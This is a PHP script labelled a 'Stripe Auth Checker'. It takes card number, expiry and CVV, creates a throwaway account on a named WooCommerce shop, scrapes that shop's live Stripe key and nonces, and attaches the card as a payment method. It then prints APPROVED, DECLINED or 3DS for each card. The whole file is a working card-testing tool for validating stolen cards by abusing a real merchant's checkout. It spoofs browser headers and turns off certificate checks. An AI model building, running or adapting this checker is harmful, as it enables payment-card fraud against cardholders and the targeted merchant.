<?php
// Advanced Stripe Auth Checker
// Uses Stripe API directly with tokenization

header('Content-Type: text/plain');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';

if (empty($card)) {
    echo "ERROR: No card provided";
    exit;
}

// Parse card details
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;

// Clean up year (handle 2-digit or 4-digit)
if (strlen($year) == 2) {
    $year = '20' . $year;
}
$yearTwoDigit = substr($year, -2);
$month = str_pad($month, 2, '0', STR_PAD_LEFT);

// Merchant configuration
$merchantDomain = "https://peeteescollection.com";
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

function getBetween($string, $start, $end) {
    $pattern = '/' . preg_quote($start, '/') . '(.*?)' . preg_quote($end, '/') . '/s';
    if (preg_match($pattern, $string, $matches)) {
        return trim($matches[1]);
    }
    return null;
}

// Step 1: Register new account
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $merchantDomain . "/my-account/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_COOKIEFILE, '');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_stripe.txt');
$response = curl_exec($ch);
curl_close($ch);

// Extract registration nonce
$regNonce = getBetween($response, 'name="woocommerce-register-nonce" value="', '"');
$wpReferer = getBetween($response, 'name="_wp_http_referer" value="', '"');

if (!$regNonce || !$wpReferer) {
    echo "DECLINED: Could not load registration page";
    exit;
}

// Generate random email
$randomName = substr(md5(uniqid()), 0, 8);
$email = $randomName . "@gmail.com";
$password = substr(md5(uniqid()), 0, 12) . "!";

// Register
$postData = http_build_query([
    'email' => $email,
    'password' => $password,
    'register' => 'Register',
    'woocommerce-register-nonce' => $regNonce,
    '_wp_http_referer' => $wpReferer
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $merchantDomain . "/my-account/");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_stripe.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_stripe.txt');
$response = curl_exec($ch);
curl_close($ch);

// Step 2: Get Stripe PK and setup nonce
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $merchantDomain . "/my-account/add-payment-method/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_stripe.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_stripe.txt');
$response = curl_exec($ch);
curl_close($ch);

// Extract Stripe publishable key
preg_match('/pk_live_[0-9a-zA-Z]+/', $response, $pkMatches);
$stripePK = $pkMatches[0] ?? null;

// Extract setup nonce
preg_match('/"createAndConfirmSetupIntentNonce":"(.*?)"/', $response, $nonceMatches);
$setupNonce = $nonceMatches[1] ?? null;

if (!$stripePK || !$setupNonce) {
    echo "DECLINED: Could not extract Stripe keys";
    exit;
}

// Step 3: Create payment method via Stripe API
$stripeData = http_build_query([
    'type' => 'card',
    'card[number]' => $cardNumber,
    'card[cvc]' => $cvv,
    'card[exp_year]' => $yearTwoDigit,
    'card[exp_month]' => $month,
    'billing_details[address][postal_code]' => '10001',
    'billing_details[address][country]' => 'US',
    'payment_user_agent' => 'stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element',
    'key' => $stripePK,
    '_stripe_version' => '2024-06-20'
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $stripeData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'user-agent: ' . $userAgent
]);
$response = curl_exec($ch);
curl_close($ch);

$stripeResult = json_decode($response, true);
$paymentMethodId = $stripeResult['id'] ?? null;

if (!$paymentMethodId) {
    $errorMsg = $stripeResult['error']['message'] ?? 'Unknown error';
    echo "DECLINED: Stripe tokenization failed - " . $errorMsg;
    exit;
}

// Step 4: Confirm setup intent
$confirmData = http_build_query([
    'action' => 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method' => $paymentMethodId,
    'wc-stripe-payment-type' => 'card',
    '_ajax_nonce' => $setupNonce
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $merchantDomain . "/?wc-ajax=wc_stripe_create_and_confirm_setup_intent");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $confirmData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['x-requested-with: XMLHttpRequest']);
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_stripe.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_stripe.txt');
$response = curl_exec($ch);
curl_close($ch);

$result = json_decode($response, true);

if ($result && isset($result['success']) && $result['success'] === true) {
    echo "APPROVED: Stripe auth successful - Payment method added";
} elseif ($result && isset($result['data']['status']) && $result['data']['status'] === 'requires_action') {
    echo "3DS: 3D Secure authentication required";
} elseif ($result && isset($result['data']['error']['message'])) {
    echo "DECLINED: " . $result['data']['error']['message'];
} else {
    echo "DECLINED: Auth failed - " . substr($response, 0, 200);
}

// Clean up cookies
@unlink('/tmp/cookies_stripe.txt');
?>
